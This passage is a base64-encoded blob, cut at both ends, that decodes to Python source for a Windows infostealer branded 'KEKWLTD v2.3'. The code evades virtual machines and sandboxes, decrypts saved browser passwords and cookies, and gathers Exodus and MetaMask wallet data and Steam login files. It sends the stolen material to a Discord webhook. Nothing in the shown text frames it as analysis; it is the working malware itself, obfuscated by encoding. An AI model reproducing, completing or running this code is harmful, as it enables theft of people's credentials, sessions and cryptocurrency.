cy5zdGFydCgpCiAgICAgICAgZm9yIHQgaW4gc2VsZi5wcm9jZXNzZXM6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHQuam9pbigpCiAgICAgICAgICAgIGV4Y2VwdCBSdW50aW1lRXJyb3I6CiAgICAgICAgICAgICAgICBjb250aW51ZQoKICAgIGRlZiBwcm9ncmFtRXhpdChzZWxmKToKICAgICAgICBzZWxmLl9fY2xhc3NfXy5pblZNID0gVHJ1ZQoKICAgIGRlZiBsc3RjaGVjKHNlbGYpOgogICAgICAgIGZvciBwYXRoIGluIFtyJ0Q6XFRvb2xzJywgcidEOlxPUzInLCByJ0Q6XE5UM1gnXToKICAgICAgICAgICAgaWYgbnRwYXRoLmV4aXN0cyhwYXRoKToKICAgICAgICAgICAgICAgIHNlbGYucHJvZ3JhbUV4aXQoKQoKICAgICAgICBmb3IgdXNlciBpbiBzZWxmLmJsdXNldXJzOgogICAgICAgICAgICBpZiBpbmZvY29tID09IHVzZXI6CiAgICAgICAgICAgICAgICBzZWxmLnByb2dyYW1FeGl0KCkKCiAgICAgICAgZm9yIHBjTmFtZSBpbiBzZWxmLmJscGNuYW1lOgogICAgICAgICAgICBpZiB2Y3RtX3BjID09IHBjTmFtZToKICAgICAgICAgICAgICAgIHNlbGYucHJvZ3JhbUV4aXQoKQoKICAgICAgICBmb3IgcGNJUCBpbiBzZWxmLmJsaXBzOgogICAgICAgICAgICBpZiBzZWxmLm5ldF8xZm8oKVswXSA9PSBwY0lQOgogICAgICAgICAgICAgICAgc2VsZi5wcm9ncmFtRXhpdCgpCgogICAgICAgIGZvciB1dWlkd25keiBpbiBzZWxmLmJsaHdpZDoKICAgICAgICAgICAgaWYgc2VsZi5zeXNfMWZvKClbMF0gPT0gdXVpZHduZHo6CiAgICAgICAgICAgICAgICBzZWxmLnByb2dyYW1FeGl0KCkKCiAgICBkZWYgc3AzY0NoZXEoc2VsZik6CiAgICAgICAgaWYgaW50KHI0bSkgPD0gMzogCiAgICAgICAgICAgIHNlbGYucHJvZ3JhbUV4aXQoKQogICAgICAgIGlmIGludChkMXNrKSA8PSAxMjA6ICAKICAgICAgICAgICAgc2VsZi5wcm9ncmFtRXhpdCgpCiAgICAgICAgaWYgaW50KHBzdXRpbC5jcHVfY291bnQoKSkgPD0gMToKICAgICAgICAgICAgc2VsZi5wcm9ncmFtRXhpdCgpCgogICAgZGVmIHJlZ2tleShzZWxmKToKICAgICAgICByZWcxID0gb3Muc3lzdGVtKCJSRUcgUVVFUlkgSEtFWV9MT0NBTF9NQUNISU5FXFxTWVNURU1cXENvbnRyb2xTZXQwMDFcXENvbnRyb2xcXENsYXNzXFx7NEQzNkU5NjgtRTMyNS0xMUNFLUJGQzEtMDgwMDJCRTEwMzE4fVxcMDAwMFxcRHJpdmVyRGVzYyAyPiBudWwiKQogICAgICAgIHJlZzIgPSBvcy5zeXN0ZW0oIlJFRyBRVUVSWSBIS0VZX0xPQ0FMX01BQ0hJTkVcXFNZU1RFTVxcQ29udHJvbFNldDAwMVxcQ29udHJvbFxcQ2xhc3NcXHs0RDM2RTk2OC1FMzI1LTExQ0UtQkZDMS0wODAwMkJFMTAzMTh9XFwwMDAwXFxQcm92aWRlck5hbWUgMj4gbnVsIikKICAgICAgICBpZiAocmVnMSBhbmQgcmVnMikgIT0gMToKICAgICAgICAgICAgc2VsZi5wcm9ncmFtRXhpdCgpCgogICAgICAgIGhhbmRsZSA9IHdpbnJlZy5PcGVuS2V5KHdpbnJlZy5IS0VZX0xPQ0FMX01BQ0hJTkUsICdTWVNURU1cXEN1cnJlbnRDb250cm9sU2V0XFxTZXJ2aWNlc1xcRGlza1xcRW51bScpCiAgICAgICAgdHJ5OgogICAgICAgICAgICByZWdfdmFsID0gd2lucmVnLlF1ZXJ5VmFsdWVFeChoYW5kbGUsICcwJylbMF0KICAgICAgICAgICAgaWYgKCJWTXdhcmUiIG9yICJWQk9YIikgaW4gcmVnX3ZhbDoKICAgICAgICAgICAgICAgIHNlbGYucHJvZ3JhbUV4aXQoKQogICAgICAgIGZpbmFsbHk6CiAgICAgICAgICAgIHdpbnJlZy5DbG9zZUtleShoYW5kbGUpCgoKCgoKCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyIgYW5kIG9zLm5hbWUgPT0gIm50IjoKICAgIGFzeW5jaW8ucnVuKGJjX2luaXRpYWxfZnVuYygpLmluaXQoKSkKICAgIAoKCgoKbG9jYWwgPSBvcy5nZXRlbnYoJ0xPQ0FMQVBQREFUQScpCnJvYW1pbmcgPSBvcy5nZXRlbnYoJ0FQUERBVEEnKQp0ZW1wID0gb3MuZ2V0ZW52KCJURU1QIikKVGhyZWFkbGlzdCA9IFtdCgpkZWYgZmV0Y2hfY29uZihlOiBzdHIpIC0+IHN0ciBvciBib29sIHwgTm9uZToKICAgICAgICByZXR1cm4gX19jb25maWdfXy5nZXQoZSkKCmhvb2sgPSBmZXRjaF9jb25mKCJ5b3Vyd2ViaG9va3VybCIpCgpjbGFzcyBEQVRBX0JMT0IoU3RydWN0dXJlKToKICAgIF9maWVsZHNfID0gWwogICAgICAgICgnY2JEYXRhJywgd2ludHlwZXMuRFdPUkQpLAogICAgICAgICgncGJEYXRhJywgUE9JTlRFUihjX2NoYXIpKQogICAgXQoKZGVmIEdldERhdGEoYmxvYl9vdXQpOgogICAgY2JEYXRhID0gaW50KGJsb2Jfb3V0LmNiRGF0YSkKICAgIHBiRGF0YSA9IGJsb2Jfb3V0LnBiRGF0YQogICAgYnVmZmVyID0gY19idWZmZXIoY2JEYXRhKQogICAgY2RsbC5tc3ZjcnQubWVtY3B5KGJ1ZmZlciwgcGJEYXRhLCBjYkRhdGEpCiAgICB3aW5kbGwua2VybmVsMzIuTG9jYWxGcmVlKHBiRGF0YSkKICAgIHJldHVybiBidWZmZXIucmF3CgpkZWYgQ3J5cHRVbnByb3RlY3REYXRhKGVuY3J5cHRlZF9ieXRlcywgZW50cm9weT1iJycpOgogICAgYnVmZmVyX2luID0gY19idWZmZXIoZW5jcnlwdGVkX2J5dGVzLCBsZW4oZW5jcnlwdGVkX2J5dGVzKSkKICAgIGJ1ZmZlcl9lbnRyb3B5ID0gY19idWZmZXIoZW50cm9weSwgbGVuKGVudHJvcHkpKQogICAgYmxvYl9pbiA9IERBVEFfQkxPQihsZW4oZW5jcnlwdGVkX2J5dGVzKSwgYnVmZmVyX2luKQogICAgYmxvYl9lbnRyb3B5ID0gREFUQV9CTE9CKGxlbihlbnRyb3B5KSwgYnVmZmVyX2VudHJvcHkpCiAgICBibG9iX291dCA9IERBVEFfQkxPQigpCgogICAgaWYgd2luZGxsLmNyeXB0MzIuQ3J5cHRVbnByb3RlY3REYXRhKGJ5cmVmKGJsb2JfaW4pLCBOb25lLCBieXJlZihibG9iX2VudHJvcHkpLCBOb25lLCBOb25lLCAweDAxLCBieXJlZihibG9iX291dCkpOgogICAgICAgIHJldHVybiBHZXREYXRhKGJsb2Jfb3V0KQoKZGVmIERlY3J5cHRWYWx1ZShidWZmLCBtYXN0ZXJfa2V5PU5vbmUpOgogICAgc3RhcnRzID0gYnVmZi5kZWNvZGUoZW5jb2Rpbmc9J3V0ZjgnLCBlcnJvcnM9J2lnbm9yZScpWzozXQogICAgaWYgc3RhcnRzID09ICd2MTAnIG9yIHN0YXJ0cyA9PSAndjExJzoKICAgICAgICBpdiA9IGJ1ZmZbMzoxNV0KICAgICAgICBwYXlsb2FkID0gYnVmZlsxNTpdCiAgICAgICAgY2lwaGVyID0gQUVTLm5ldyhtYXN0ZXJfa2V5LCBBRVMuTU9ERV9HQ00sIGl2KQogICAgICAgIGRlY3J5cHRlZF9wYXNzID0gY2lwaGVyLmRlY3J5cHQocGF5bG9hZCkKICAgICAgICBkZWNyeXB0ZWRfcGFzcyA9IGRlY3J5cHRlZF9wYXNzWzotMTZdLmRlY29kZSgpCiAgICAgICAgcmV0dXJuIGRlY3J5cHRlZF9wYXNzCgpkZWYgTG9hZFJlcXVlc3RzKG1ldGhvZGUsIHVybCwgZGF0YT0nJywgZmlsZXM9JycsIGhlYWRlcnM9JycpOgogICAgZm9yIGkgaW4gcmFuZ2UoOCk6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBpZiBtZXRob2RlID09ICdQT1NUJzoKICAgICAgICAgICAgICAgIGlmIGRhdGEgIT0gJyc6CiAgICAgICAgICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QodXJsLCBkYXRhPWRhdGEpCiAgICAgICAgICAgICAgICAgICAgaWYgci5zdGF0dXNfY29kZSA9PSAyMDA6CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiByCiAgICAgICAgICAgICAgICBlbGlmIGZpbGVzICE9ICcnOgogICAgICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KHVybCwgZmlsZXM9ZmlsZXMpCiAgICAgICAgICAgICAgICAgICAgaWYgci5zdGF0dXNfY29kZSA9PSAyMDAgb3Igci5zdGF0dXNfY29kZSA9PSA0MTM6ICMgNDEzID0gREFUQSBUTyBCSUcKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHIKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHBhc3MKCmRlZiBMb2FkVXJsaWIoaG9vaywgZGF0YT0nJywgZmlsZXM9JycsIGhlYWRlcnM9JycpOgogICAgZm9yIGkgaW4gcmFuZ2UoOCk6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBpZiBoZWFkZXJzICE9ICcnOgogICAgICAgICAgICAgICAgciA9IHVybG9wZW4oUmVxdWVzdChob29rLCBkYXRhPWRhdGEsIGhlYWRlcnM9aGVhZGVycykpCiAgICAgICAgICAgICAgICByZXR1cm4gcgogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgciA9IHVybG9wZW4oUmVxdWVzdChob29rLCBkYXRhPWRhdGEpKQogICAgICAgICAgICAgICAgcmV0dXJuIHIKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHBhc3MKCgpkZWYgVHJ1c3QoQ29va2llcyk6CiAgICBnbG9iYWwgREVURUNURUQKICAgIGRhdGEgPSBzdHIoQ29va2llcykKICAgIHRpbSA9IHJlLmZpbmRhbGwoIi5nb29nbGUuY29tIiwgZGF0YSkKICAgIGlmIGxlbih0aW0pIDwgLTE6CiAgICAgICAgREVURUNURUQgPSBUcnVlCiAgICAgICAgcmV0dXJuIERFVEVDVEVECiAgICBlbHNlOgogICAgICAgIERFVEVDVEVEID0gRmFsc2UKICAgICAgICByZXR1cm4gREVURUNURUQKCgoKCmRlZiBSZWZvcm1hdChsaXN0dCk6CiAgICBlID0gcmUuZmluZGFsbCgiKFx3K1thLXpdKSIsbGlzdHQpCiAgICB3aGlsZSAiaHR0cHMiIGluIGU6IGUucmVtb3ZlKCJodHRwcyIpCiAgICB3aGlsZSAiY29tIiBpbiBlOiBlLnJlbW92ZSgiY29tIikKICAgIHdoaWxlICJuZXQiIGluIGU6IGUucmVtb3ZlKCJuZXQiKQogICAgcmV0dXJuIGxpc3Qoc2V0KGUpKQoKZGVmIHVwbG9hZChuYW1lLCB0az0nJyk6CiAgICBoZWFkZXJzID0gewogICAgICAgICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTAyLjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTAyLjAiCiAgICB9CgogICAgaWYgbmFtZSA9PSAiYmNfY2hlY2tpbmciOgogICAgICAgIGRhdGEgPSB7CiAgICAgICAgImNvbnRlbnQiOiAnJywKICAgICAgICAiZW1iZWRzIjogWwogICAgICAgICAgICB7CiAgICAgICAgICAgICJmaWVsZHMiOiBbCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAibmFtZSI6ICJJbnRlcmVzdGluZyBmaWxlcyBmb3VuZCBvbiB1c2VyIFBDOiIsCiAgICAgICAgICAgICAgICAidmFsdWUiOiB0awogICAgICAgICAgICAgICAgfQogICAgICAgICAgICBdLAogICAgICAgICAgICAiYXV0aG9yIjogewogICAgICAgICAgICAgICAgJ25hbWUnOiBmJ0tFS1dMVEQgdjIuMycsCiAgICAgICAgICAgICAgICAndXJsJzogJ2h0dHBzOi8va2Vrd2x0ZC5ydScsCiAgICAgICAgICAgICAgICAnaWNvbl91cmwnOiAnaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXZhdGFycy8yMjg1NDkxMTM1ODE1MzUyMzUvNDMwZjgxZWFkNjdlYWZmY2FmZmJiNmU3YjBhZjI5MjcucG5nJwogICAgICAgICAgICB9LAogICAgICAgICAgICAiZm9vdGVyIjogewogICAgICAgICAgICAgICAgInRleHQiOiAia2Vrd2x0ZC5ydSIKICAgICAgICAgICAgfSwKICAgICAgICAgICAgJ2NvbG9yJzogMzc0Mjc2LAogICAgICAgICAgICB9CiAgICAgICAgXSwKICAgICAgICAiYXZhdGFyX3VybCI6ICJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdmF0YXJzLzIyODU0OTExMzU4MTUzNTIzNS80MzBmODFlYWQ2N2VhZmZjYWZmYmI2ZTdiMGFmMjkyNy5wbmciLAogICAgICAgICJhdHRhY2htZW50cyI6IFtdCiAgICAgICAgfQogICAgICAgIExvYWRVcmxpYihob29rLCBkYXRhPWR1bXBzKGRhdGEpLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMpCiAgICAgICAgcmV0dXJuCgogICAgcGF0aCA9IG5hbWUKICAgIGZpbGVzID0geydmaWxlJzogb3BlbihwYXRoLCAncmInKX0KCiAgICBpZiAiYmNfYWxscGFzc3dvcmRzIiBpbiBuYW1lOgoKICAgICAgICByYSA9ICcgfCAnLmpvaW4oZGEgZm9yIGRhIGluIHBhc3dXb3JkcykKCiAgICAgICAgaWYgbGVuKHJhKSA+IDEwMDA6CiAgICAgICAgICAgIHJyciA9IFJlZm9ybWF0KHN0cihwYXN3V29yZHMpKQogICAgICAgICAgICByYSA9ICcgfCAnLmpvaW4oZGEgZm9yIGRhIGluIHJycikKCiAgICAgICAgZGF0YSA9IHsKICAgICAgICAiY29udGVudCI6ICcnLAogICAgICAgICJlbWJlZHMiOiBbCiAgICAgICAgICAgIHsKICAgICAgICAgICAgImZpZWxkcyI6IFsKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICJuYW1lIjogIlBhc3N3b3JkcyBGb3VuZDoiLAogICAgICAgICAgICAgICAgInZhbHVlIjogcmEKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgXSwKICAgICAgICAgICAgImF1dGhvciI6IHsKICAgICAgICAgICAgICAgICduYW1lJzogZidLRUtXTFREIHYyLjMnLAogICAgICAgICAgICAgICAgJ3VybCc6ICdodHRwczovL2tla3dsdGQucnUnLAogICAgICAgICAgICAgICAgJ2ljb25fdXJsJzogJ2h0dHBzOi8vY2RuLmRpc2NvcmRhcHAuY29tL2F2YXRhcnMvMjI4NTQ5MTEzNTgxNTM1MjM1LzQzMGY4MWVhZDY3ZWFmZmNhZmZiYjZlN2IwYWYyOTI3LnBuZycKICAgICAgICAgICAgfSwKICAgICAgICAgICAgImZvb3RlciI6IHsKICAgICAgICAgICAgICAgICJ0ZXh0IjogImtla3dsdGQucnUiLAogICAgICAgICAgICB9LAogICAgICAgICAgICAnY29sb3InOiAzNzQyNzYsCiAgICAgICAgICAgIH0KICAgICAgICBdLAogICAgICAgICAiYXZhdGFyX3VybCI6ICJodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdmF0YXJzLzIyODU0OTExMzU4MTUzNTIzNS80MzBmODFlYWQ2N2VhZmZjYWZmYmI2ZTdiMGFmMjkyNy5wbmciLAogICAgICAgICJhdHRhY2htZW50cyI6IFtdCiAgICAgICAgfQogICAgICAgIExvYWRVcmxpYihob29rLCBkYXRhPWR1bXBzKGRhdGEpLmVuY29kZSgpLCBoZWFkZXJzPWhlYWRlcnMpCgogICAgaWYgImJjX2FsbGNvb2tpZXMiIGluIG5hbWU6CiAgICAgICAgcmIgPSAnIHwgJy5qb2luKGRhIGZvciBkYSBpbiBjb29raVdvcmRzKQogICAgICAgIGlmIGxlbihyYikgPiAxMDAwOgogICAgICAgICAgICBycnJyciA9IFJlZm9ybWF0KHN0cihjb29raVdvcmRzKSkKICAgICAgICAgICAgcmIgPSAnIHwgJy5qb2luKGRhIGZvciBkYSBpbiBycnJycikKCiAgICAgICAgZGF0YSA9IHsKICAgICAgICAiY29udGVudCI6ICcnLAogICAgICAgICJlbWJlZHMiOiBbCiAgICAgICAgICAgIHsKICAgICAgICAgICAgImZpZWxkcyI6IFsKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICJuYW1lIjogIkNvb2tpZXMgRm91bmQ6IiwKICAgICAgICAgICAgICAgICJ2YWx1ZSI6IHJiCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIF0sCiAgICAgICAgICAgICJhdXRob3IiOiB7CiAgICAgICAgICAgICAgICAnbmFtZSc6IGYnS0VLV0xURCB2Mi4zJywKICAgICAgICAgICAgICAgICd1cmwnOiAnaHR0cHM6Ly9rZWt3bHRkLnJ1JywKICAgICAgICAgICAgICAgICdpY29uX3VybCc6ICdodHRwczovL2Nkbi5kaXNjb3JkYXBwLmNvbS9hdmF0YXJzLzIyODU0OTExMzU4MTUzNTIzNS80MzBmODFlYWQ2N2VhZmZjYWZmYmI2ZTdiMGFmMjkyNy5wbmcnCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgICJmb290ZXIiOiB7CiAgICAgICAgICAgICAgICAidGV4dCI6ICJrZWt3bHRkLnJ1IiwKICAgICAgICAgICAgfSwKICAgICAgICAgICAgJ2NvbG9yJzogMzc0Mjc2LAogICAgICAgICAgICB9CiAgICAgICAgXSwKICAgICAgICAgImF2YXRhcl91cmwiOiAiaHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXZhdGFycy8yMjg1NDkxMTM1ODE1MzUyMzUvNDMwZjgxZWFkNjdlYWZmY2FmZmJiNmU3YjBhZjI5MjcucG5nIiwKICAgICAgICAiYXR0YWNobWVudHMiOiBbXQogICAgICAgIH0KICAgICAgICBMb2FkVXJsaWIoaG9vaywgZGF0YT1kdW1wcyhkYXRhKS5lbmNvZGUoKSwgaGVhZGVycz1oZWFkZXJzKQoKICAgIExvYWRSZXF1ZXN0cygiUE9TVCIsIGhvb2ssIGZpbGVzPWZpbGVzKQoKZGVmIHdyaXRlZm9yZmlsZShkYXRhLCBuYW1lKToKICAgIHBhdGggPSBvcy5nZXRlbnYoIlRFTVAiKSArIGYiXHtuYW1lfS50eHQiCiAgICB3aXRoIG9wZW4ocGF0aCwgbW9kZT0ndycsIGVuY29kaW5nPSd1dGYtOCcpIGFzIGY6CiAgICAgICAgZi53cml0ZShmIktFS1dMVEQgfCBodHRwczovL2tla3dsdGQucnVcblxuIikKICAgICAgICBmb3IgbGluZSBpbiBkYXRhOgogICAgICAgICAgICBpZiBsaW5lWzBdICE9ICcnOgogICAgICAgICAgICAgICAgZi53cml0ZShmIntsaW5lfVxuIikKCgoKUGFzc3cgPSBbXQpkZWYgZ2V0UGFzc3cocGF0aCwgYXJnKToKICAgIGdsb2JhbCBQYXNzdwogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHBhdGgpOiByZXR1cm4KCiAgICBwYXRoQyA9IHBhdGggKyBhcmcgKyAiL0xvZ2luIERhdGEiCiAgICBpZiBvcy5zdGF0KHBhdGhDKS5zdF9zaXplID09IDA6IHJldHVybgoKICAgIHRlbXBmb2xkID0gdGVtcCArICJrZWt3bHRkIiArICcnLmpvaW4ocmFuZG9tLmNob2ljZSgnYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5eicpIGZvciBpIGluIHJhbmdlKDgpKSArICIuZGIiCiAgICBzaHV0aWwuY29weTIocGF0aEMsIHRlbXBmb2xkKQogICAgY29ubiA9IGNvbm5lY3QodGVtcGZvbGQpCiAgICBjdXJzb3IgPSBjb25uLmN1cnNvcigpCiAgICBjdXJzb3IuZXhlY3V0ZSgiU0VMRUNUIGFjdGlvbl91cmwsIHVzZXJuYW1lX3ZhbHVlLCBwYXNzd29yZF92YWx1ZSBGUk9NIGxvZ2luczsiKQogICAgZGF0YSA9IGN1cnNvci5mZXRjaGFsbCgpCiAgICBjdXJzb3IuY2xvc2UoKQogICAgY29ubi5jbG9zZSgpCiAgICBvcy5yZW1vdmUodGVtcGZvbGQpCgogICAgcGF0aEtleSA9IHBhdGggKyAiL0xvY2FsIFN0YXRlIgogICAgd2l0aCBvcGVuKHBhdGhLZXksICdyJywgZW5jb2Rpbmc9J3V0Zi04JykgYXMgZjogbG9jYWxfc3RhdGUgPSBsb2FkcyhmLnJlYWQoKSkKICAgIG1hc3Rlcl9rZXkgPSBiNjRkZWNvZGUobG9jYWxfc3RhdGVbJ29zX2NyeXB0J11bJ2VuY3J5cHRlZF9rZXknXSkKICAgIG1hc3Rlcl9rZXkgPSBDcnlwdFVucHJvdGVjdERhdGEobWFzdGVyX2tleVs1Ol0pCgogICAgZm9yIHJvdyBpbiBkYXRhOgogICAgICAgIGlmIHJvd1swXSAhPSAnJzoKICAgICAgICAgICAgZm9yIHdhIGluIGtleXdvcmQ6CiAgICAgICAgICAgICAgICBvbGQgPSB3YQogICAgICAgICAgICAgICAgaWYgImh0dHBzIiBpbiB3YToKICAgICAgICAgICAgICAgICAgICB0bXAgPSB3YQogICAgICAgICAgICAgICAgICAgIHdhID0gdG1wLnNwbGl0KCdbJylbMV0uc3BsaXQoJ10nKVswXQogICAgICAgICAgICAgICAgaWYgd2EgaW4gcm93WzBdOgogICAgICAgICAgICAgICAgICAgIGlmIG5vdCBvbGQgaW4gcGFzd1dvcmRzOiBwYXN3V29yZHMuYXBwZW5kKG9sZCkKICAgICAgICAgICAgUGFzc3cuYXBwZW5kKGYiVVJMOiB7cm93WzBdfSBcbiBJRDoge3Jvd1sxXX0gXG4gUEFTU1cwUkQ6IHtEZWNyeXB0VmFsdWUocm93WzJdLCBtYXN0ZXJfa2V5KX1cblxuIikKICAgIHdyaXRlZm9yZmlsZShQYXNzdywgJ2JjX2FsbHBhc3N3b3JkcycpCgpDb29raWVzID0gW10KZGVmIGdldENvb2tpZShwYXRoLCBhcmcpOgogICAgZ2xvYmFsIENvb2tpZXMKICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoKTogcmV0dXJuCgogICAgcGF0aEMgPSBwYXRoICsgYXJnICsgIi9Db29raWVzIgogICAgaWYgb3Muc3RhdChwYXRoQykuc3Rfc2l6ZSA9PSAwOiByZXR1cm4KCiAgICB0ZW1wZm9sZCA9IHRlbXAgKyAia2Vrd2x0ZCIgKyAnJy5qb2luKHJhbmRvbS5jaG9pY2UoJ2JjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXonKSBmb3IgaSBpbiByYW5nZSg4KSkgKyAiLmRiIgoKICAgIHNodXRpbC5jb3B5MihwYXRoQywgdGVtcGZvbGQpCiAgICBjb25uID0gY29ubmVjdCh0ZW1wZm9sZCkKICAgIGN1cnNvciA9IGNvbm4uY3Vyc29yKCkKICAgIGN1cnNvci5leGVjdXRlKCJTRUxFQ1QgaG9zdF9rZXksIG5hbWUsIGVuY3J5cHRlZF92YWx1ZSBGUk9NIGNvb2tpZXMiKQogICAgZGF0YSA9IGN1cnNvci5mZXRjaGFsbCgpCiAgICBjdXJzb3IuY2xvc2UoKQogICAgY29ubi5jbG9zZSgpCiAgICBvcy5yZW1vdmUodGVtcGZvbGQpCgogICAgcGF0aEtleSA9IHBhdGggKyAiL0xvY2FsIFN0YXRlIgoKICAgIHdpdGggb3BlbihwYXRoS2V5LCAncicsIGVuY29kaW5nPSd1dGYtOCcpIGFzIGY6IGxvY2FsX3N0YXRlID0gbG9hZHMoZi5yZWFkKCkpCiAgICBtYXN0ZXJfa2V5ID0gYjY0ZGVjb2RlKGxvY2FsX3N0YXRlWydvc19jcnlwdCddWydlbmNyeXB0ZWRfa2V5J10pCiAgICBtYXN0ZXJfa2V5ID0gQ3J5cHRVbnByb3RlY3REYXRhKG1hc3Rlcl9rZXlbNTpdKQoKICAgIGZvciByb3cgaW4gZGF0YToKICAgICAgICBpZiByb3dbMF0gIT0gJyc6CiAgICAgICAgICAgIGZvciB3YSBpbiBrZXl3b3JkOgogICAgICAgICAgICAgICAgb2xkID0gd2EKICAgICAgICAgICAgICAgIGlmICJodHRwcyIgaW4gd2E6CiAgICAgICAgICAgICAgICAgICAgdG1wID0gd2EKICAgICAgICAgICAgICAgICAgICB3YSA9IHRtcC5zcGxpdCgnWycpWzFdLnNwbGl0KCddJylbMF0KICAgICAgICAgICAgICAgIGlmIHdhIGluIHJvd1swXToKICAgICAgICAgICAgICAgICAgICBpZiBub3Qgb2xkIGluIGNvb2tpV29yZHM6IGNvb2tpV29yZHMuYXBwZW5kKG9sZCkKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgQ29va2llcy5hcHBlbmQoZiJ7cm93WzBdfQlUUlVFIisiCQkiKyBmIi9GQUxTRQkyNTk3NTczNDU2CXtyb3dbMV19CXtEZWNyeXB0VmFsdWUocm93WzJdLCBtYXN0ZXJfa2V5KX0iKQogICAgICAgICAgICAKICAgIHdyaXRlZm9yZmlsZShDb29raWVzLCAnYmNfYWxsY29va2llcycpCgpkZWYgY2hlY2tJZlByb2Nlc3NSdW5uaW5nKHByb2Nlc3NOYW1lKToKICAgICcnJwogICAgQ2hlY2sgaWYgdGhlcmUgaXMgYW55IHJ1bm5pbmcgcHJvY2VzcyB0aGF0IGNvbnRhaW5zIHRoZSBnaXZlbiBuYW1lIHByb2Nlc3NOYW1lLgogICAgJycnCiAgICAjSXRlcmF0ZSBvdmVyIHRoZSBhbGwgdGhlIHJ1bm5pbmcgcHJvY2VzcwogICAgZm9yIHByb2MgaW4gcHN1dGlsLnByb2Nlc3NfaXRlcigpOgogICAgICAgIHRyeToKICAgICAgICAgICAgIyBDaGVjayBpZiBwcm9jZXNzIG5hbWUgY29udGFpbnMgdGhlIGdpdmVuIG5hbWUgc3RyaW5nLgogICAgICAgICAgICBpZiBwcm9jZXNzTmFtZS5sb3dlcigpIGluIHByb2MubmFtZSgpLmxvd2VyKCk6CiAgICAgICAgICAgICAgICByZXR1cm4gVHJ1ZQogICAgICAgIGV4Y2VwdCAocHN1dGlsLk5vU3VjaFByb2Nlc3MsIHBzdXRpbC5BY2Nlc3NEZW5pZWQsIHBzdXRpbC5ab21iaWVQcm9jZXNzKToKICAgICAgICAgICAgcGFzcwogICAgcmV0dXJuIEZhbHNlOwoKCmRlZiBaaXBUaGluZ3MocGF0aCwgYXJnLCBwcm9jYyk6CiAgICBwYXRoQyA9IHBhdGgKICAgIG5hbWUgPSBhcmcKICAgIGlmICJhaG9scGZkaWFsamdqZmhvbWloa2pibWdqaWRsY2RubyIgaW4gYXJnOgogICAgICAgIGJyb3dzZXIgPSBwYXRoLnNwbGl0KCJcXCIpWzRdLnNwbGl0KCIvIilbMV0ucmVwbGFjZSgnICcsICcnKQogICAgICAgIG5hbWUgPSBmIkV4b2R1c197YnJvd3Nlcn0iCiAgICAgICAgcGF0aEMgPSBwYXRoICsgYXJnCgogICAgaWYgIm5rYmloZmJlb2dhZWFvZWhsZWZua29kYmVmZ3Bna25uIiBpbiBhcmc6CiAgICAgICAgYnJvd3NlciA9IHBhdGguc3BsaXQoIlxcIilbNF0uc3BsaXQoIi8iKVsxXS5yZXBsYWNlKCcgJywgJycpCiAgICAgICAgbmFtZSA9IGYiTWV0YW1hc2tfe2Jyb3dzZXJ9IgogICAgICAgIHBhdGhDID0gcGF0aCArIGFyZwoKICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhwYXRoQyk6IHJldHVybgogICAgaWYgY2hlY2tJZlByb2Nlc3NSdW5uaW5nKCdjaHJvbWUuZXhlJyk6CiAgICAgICAgcHJpbnQoJ1llcyBhIGNocm9tZSBwcm9jZXNzIHdhcyBydW5uaW5nJykKICAgICAgICBzdWJwcm9jZXNzLlBvcGVuKGYidGFza2tpbGwgL2ltIHtwcm9jY30gL3QgL2YiLCBzaGVsbD1UcnVlKQogICAgZWxzZToKICAgICAgICAuLi4KICAgICAgICAKCiAgICBpZiAiV2FsbGV0IiBpbiBhcmcgb3IgIk5hdGlvbnNHbG9yeSIgaW4gYXJnOgogICAgICAgIGJyb3dzZXIgPSBwYXRoLnNwbGl0KCJcXCIpWzRdLnNwbGl0KCIvIilbMV0ucmVwbGFjZSgnICcsICcnKQogICAgICAgIG5hbWUgPSBmInticm93c2VyfSIKCiAgICBlbGlmICJTdGVhbSIgaW4gYXJnOgogICAgICAgIGlmIG5vdCBvcy5wYXRoLmlzZmlsZShmIntwYXRoQ30vbG9naW51c2Vycy52ZGYiKTogcmV0dXJuCiAgICAgICAgZiA9IG9wZW4oZiJ7cGF0aEN9L2xvZ2ludXNlcnMudmRmIiwgInIrIiwgZW5jb2Rpbmc9InV0ZjgiKQogICAgICAgIGRhdGEgPSBmLnJlYWRsaW5lcygpCiAgICAgICAgZm91bmQgPSBGYWxzZQogICAgICAgIGZvciBsIGluIGRhdGE6CiAgICAgICAgICAgIGlmICdSZW1lbWJlclBhc3N3b3JkIlx0XHQiMSInIGluIGw6CiAgICAgICAgICAgICAgICBmb3VuZCA9IFRydWUKICAgICAgICBpZiBmb3VuZCA9PSBGYWxzZTogcmV0dXJuCiAgICAgICAgbmFtZSA9IGFyZwoKICAgIHpmID0gemlwZmlsZS5aaXBGaWxlKGYie3